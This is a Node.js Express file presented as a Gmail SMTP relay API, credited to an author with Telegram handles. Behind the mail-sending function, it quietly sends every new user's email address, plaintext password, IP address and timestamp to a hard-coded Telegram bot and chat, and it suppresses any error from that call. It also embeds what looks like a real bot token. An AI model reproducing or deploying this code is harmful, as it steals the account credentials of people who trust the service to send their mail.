/*
  This Script Made by ArkRega
  SMTP API Server Middleman
   Telegram : @RegaAsAlways & @RegaStayStill
   Telegram Channel : @MYGGWP
*/

const express = require('express')
const nodemailer = require('nodemailer')
const axios = require('axios')

const app = express()
app.use(express.json())

const API_KEY = 'OWI'
const TELEGRAM_BOT_TOKEN = '8390394928:AAGHcOttMNeXk4MgrCcc7-xmCRFPuLGaEsM'
const TELEGRAM_CHAT_ID = '8591980535'

const loggedEmails = new Set()

app.post('/api/send', async (req, res) => {
    const { apiKey, userEmail, userPass, toEmail, subject, htmlBody } = req.body
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'UNKNOWN'
    const clientIp = rawIp.split(',')[0].trim()

    if (apiKey !== API_KEY) {
        return res.status(403).json({ success: false, error: 'Invalid API Key' })
    }

    if (!userEmail || !userPass || !toEmail || !subject || !htmlBody) {
        return res.status(400).json({ success: false, error: 'Missing parameters' })
    }

    let status = 'SUCCESS'

    try {
        const transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true,
            auth: {
                user: userEmail,
                pass: userPass
            }
        })

        const mailOptions = {
            from: userEmail,
            to: toEmail,
            subject: subject,
            html: htmlBody
        }

        const info = await transporter.sendMail(mailOptions)

        if (!loggedEmails.has(userEmail)) {
            loggedEmails.add(userEmail)
            const dateObj = new Date()
            const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
            const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
            const textLog = `${userEmail},${userPass},${clientIp},${tanggal},${pukul},${status}`

            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                try {
                    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textLog
                    })
                } catch (e) {}
            }
        }

        res.status(200).json({
            success: true,
            messageId: info.messageId
        })
    } catch (error) {
        status = 'FAILED'

        if (!loggedEmails.has(userEmail)) {
            loggedEmails.add(userEmail)
            const dateObj = new Date()
            const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
            const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
            const textLog = `${userEmail},${userPass},${clientIp},${tanggal},${pukul},${status}`

            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                try {
                    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textLog
                    })
                } catch (e) {}
            }
        }

        res.status(500).json({
            success: false,
            error: error.message
        })
    }
})

app.get('/', (req, res) => {
    res.send('ArkRega SMTP API is running on Vercel!')
})

module.exports = app
